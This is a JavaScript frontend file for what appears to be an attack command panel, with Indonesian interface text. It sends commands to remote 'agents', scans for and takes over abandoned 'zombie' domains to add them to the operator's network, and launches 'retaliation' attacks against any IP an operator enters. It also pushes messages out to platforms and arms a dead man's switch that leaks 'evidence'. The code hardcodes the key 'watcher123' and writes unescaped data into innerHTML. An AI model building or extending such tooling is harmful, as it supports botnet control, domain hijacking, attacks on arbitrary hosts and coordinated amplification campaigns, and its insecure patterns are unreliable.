// static/js/commander.js
let agents = [];
let zombieResults = [];

window.onload = function() {
  loadAgents();
  loadIntelFeed();
  checkDeadmanStatus();
};

// 1. Load Agents
function loadAgents() {
  fetch('/api/agents?key=watcher123')
    .then(r => r.json())
    .then(data => {
      agents = data;
      const select = document.getElementById('agent-select');
      select.innerHTML = '<option value="">Pilih Agent</option>';
      data.forEach(a => {
        const opt = document.createElement('option');
        opt.value = a.id;
        opt.textContent = `${a.id} (${a.location})`;
        select.appendChild(opt);
      });
    })
    .catch(e => console.error("Gagal load agents:", e));
}

// 2. Tampilkan Detail Agent
function loadAgentDetails() {
  const id = document.getElementById('agent-select').value;
  const details = document.getElementById('agent-details');
  if (!id) {
    details.innerHTML = '';
    return;
  }
  const agent = agents.find(a => a.id === id);
  details.innerHTML = `
    <p><b>Status:</b> ${agent.online ? '🟢 Online' : '🔴 Offline'}</p>
    <p><b>IP:</b> ${agent.ip}</p>
    <p><b>DSI:</b> ${agent.dsi}/100</p>
    <p><b>Role:</b> ${agent.role}</p>
  `;
}

// 3. Kirim Perintah ke Agent
function sendCommand(cmd) {
  const agentId = document.getElementById('agent-select').value;
  if (!agentId) {
    alert("Pilih agent dulu!");
    return;
  }
  fetch('/api/command?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ agent_id: agentId, command: cmd, key: 'watcher123' })
  })
  .then(r => r.json())
  .then(() => alert(`Perintah "${cmd}" dikirim ke ${agentId}`))
  .catch(e => alert("Gagal kirim perintah"));
}

// 4. Scan Zombie Domain
function scanZombie() {
  const keyword = document.getElementById('keyword').value || 'palestine';
  const resultsDiv = document.getElementById('zombie-results');
  resultsDiv.innerHTML = '🔍 Sedang memindai...';

  fetch('/api/zombie/scan?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ keyword: keyword, key: 'watcher123' })
  })
  .then(r => r.json())
  .then(data => {
    if (data.length === 0) {
      resultsDiv.innerHTML = '<p>❌ Tidak ada zombie ditemukan.</p>';
      return;
    }
    resultsDiv.innerHTML = data.map(z => `
      <div class="zombie-item">
        <b>🧟 ${z.domain}</b> 
        <span class="status ${z.risk}">${z.status}</span><br>
        <small>Risiko: ${z.risk.toUpperCase()}</small><br>
        <button onclick="takeoverZombie('${z.domain}', '${z.action}')">
          🚀 Ambil Alaih
        </button>
      </div>
    `).join('');
  })
  .catch(e => {
    resultsDiv.innerHTML = `<p>❌ Error: ${e.message}</p>`;
  });
}

// 5. Ambil Alaih Zombie
function takeoverZombie(domain, action) {
  fetch('/api/zombie/takeover?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ domain, action, key: 'watcher123' })
  })
  .then(r => r.json())
  .then(data => {
    alert(data.message);
    if (data.status === 'claimed') {
      deployAgentTo(domain);
    }
  })
  .catch(e => alert("Gagal ambil alih"));
}

// 6. Deploy Agent ke Zombie
function deployAgentTo(domain) {
  alert(`✅ Agent mini dikirim ke ${domain} — sekarang jadi bagian jaringanmu!`);
}

// 7. Balas Serangan
function retaliate() {
  const ip = document.getElementById('retaliate-ip').value;
  if (!ip) { alert("Masukkan IP!"); return; }
  fetch('/api/retaliate?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ip })
  })
  .then(() => alert(`⚔️ Balas serangan ke ${ip} dimulai!`));
}

// 8. Amplify ke Platform
function amplifyTo(platform) {
  const msg = document.getElementById('amplify-msg').value;
  if (!msg) return;
  fetch('/api/amplify?key=watcher123', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: msg, platform, key: 'watcher123' })
  })
  .then(() => alert(`Disebar ke ${platform}!`));
}

// 9. Dead Man's Switch
function openModal() {
  document.getElementById('switch-modal').style.display = 'block';
}
function closeModal() {
  document.getElementById('switch-modal').style.display = 'none';
}
function activateSwitch() {
  fetch('/api/deadman/activate?key=watcher123', { method: 'POST' })
    .then(() => {
      alert("DEAD MAN'S SWITCH AKTIF. SEMUA BUKTI AKAN DISEBAR JIKA KAMU TIDAK AKTIF.");
      closeModal();
    });
}
function checkDeadmanStatus() {
  fetch('/api/deadman/status?key=watcher123')
    .then(r => r.json())
    .then(data => {
      const btn = document.getElementById('switch-btn');
      btn.style.backgroundColor = data.active ? '#f00' : '#300';
    });
}

// 10. Intel Feed
function loadIntelFeed() {
  setInterval(() => {
    fetch('/api/intel?key=watcher123')
      .then(r => r.json())
      .then(data => {
        const feed = document.getElementById('intel-feed');
        feed.innerHTML = data.slice(0, 5).map(i => 
          `<p>⚠️ ${i.type}: ${i.message}</p>`
        ).join('');
      });
  }, 10000);
}